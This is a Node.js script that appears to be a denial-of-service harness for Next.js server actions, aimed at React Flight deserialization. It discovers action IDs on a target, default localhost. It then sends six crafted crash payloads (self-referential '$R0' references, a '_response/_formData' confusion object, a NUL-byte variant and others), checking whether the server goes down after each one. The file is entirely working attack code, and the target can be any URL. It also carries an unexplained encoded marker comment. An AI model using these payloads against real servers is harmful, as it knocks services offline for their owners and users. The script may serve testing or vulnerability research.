'use strict';

const readline = require('readline');
const { discoverActionIds, sendFlightRequest, checkServerHealth } = require('../flight-harness/flightHarness');
// AndrewMohawkSpiderMark-ZGVnZW5lcmF0ZXBhcnR5dGltZQ

const DOS_CASES = [
  {
    name: 'dos-recursive-R0',
    description: 'Self-referential $R0',
    build: (actionId) => ({
      payload: '["$R0"]',
      contentType: 'text/plain;charset=UTF-8',
      nextAction: actionId,
    }),
  },
  {
    name: 'dos-malformed-row',
    description: 'Malformed row shape',
    build: (actionId) => ({
      payload: '[{"id":0,"type":"$R0"}]',
      contentType: 'text/plain;charset=UTF-8',
      nextAction: actionId,
    }),
  },
  {
    name: 'dos-response-confusion',
    description: 'Response confusion crash (_response/_formData)',
    build: (actionId) => ({
      payload: JSON.stringify({
        status: 'pending',
        reason: { then: '$F1', value: '$R0' },
        value: '$L0',
        _response: { _chunks: '$Q1', _formData: { get: '$R0' }, _prefix: '$F1' },
      }),
      contentType: 'text/plain;charset=UTF-8',
      nextAction: actionId,
    }),
  },
  {
    name: 'dos-headers-variant',
    description: 'Header matrix crash (text/plain, default Accept, Next-Action set)',
    build: (actionId) => ({
      payload: '["$R0"]',
      contentType: 'text/plain;charset=UTF-8',
      nextAction: actionId,
      // sendFlightRequest already sets Accept; we use defaults here.
    }),
  },
  {
    name: 'dos-encoding-nul',
    description: 'Encoding crash with NUL',
    build: (actionId) => ({
      payload: '["$R0\\u0000"]',
      contentType: 'text/plain;charset=UTF-8',
      nextAction: actionId,
    }),
  },
  {
    name: 'dos-type-confusion-array',
    description: 'Mixed $F/$R/$L array',
    build: (actionId) => ({
      payload: '["$F1", {"wrap":"$R0"}, ["$L0","$F1"]]',
      contentType: 'text/plain;charset=UTF-8',
      nextAction: actionId,
    }),
  },
];

function promptEnter(msg) {
  return new Promise((resolve) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    rl.question(msg, () => {
      rl.close();
      resolve();
    });
  });
}

async function warmUp(target) {
  try {
    await fetch(target, { method: 'GET' });
  } catch (e) {
    // ignore warmup errors
  }
}

async function main() {
  const target = process.argv[2] || 'http://127.0.0.1:3005/test';

  const { actionIds } = await discoverActionIds(target);
  if (!actionIds.length) {
    console.error('No action IDs discovered; ensure the target is running.');
    process.exit(1);
  }
  const actionId = actionIds[0];
  console.log(`[+] Target: ${target}`);
  console.log(`[+] Using action ID: ${actionId}`);
  console.log(`[+] Cases: ${DOS_CASES.length}`);
  console.log('');

  for (const test of DOS_CASES) {
    console.log(`=== ${test.name} (${test.description}) ===`);
    await warmUp(target);
    const before = await checkServerHealth(target);
    console.log(`Health before: ${before.ok ? 'up' : 'down'} (${before.status || before.error})`);

    const built = test.build(actionId);
    const res = await sendFlightRequest({
      target,
      actionId,
      payload: built.payload,
      contentType: built.contentType,
      nextAction: built.nextAction,
    });

    console.log(`Response: status=${res.status || 'err'} body=${(res.body || '').slice(0, 200)}`);

    const after = await checkServerHealth(target);
    console.log(`Health after: ${after.ok ? 'up' : 'down'} (${after.status || after.error})`);
    console.log('----------------------------------------');
    await promptEnter('Restart the server if needed, then press Enter to continue...\n');
  }
}

main().catch((err) => {
  console.error(`Fatal: ${err.message}`);
  process.exit(1);
});
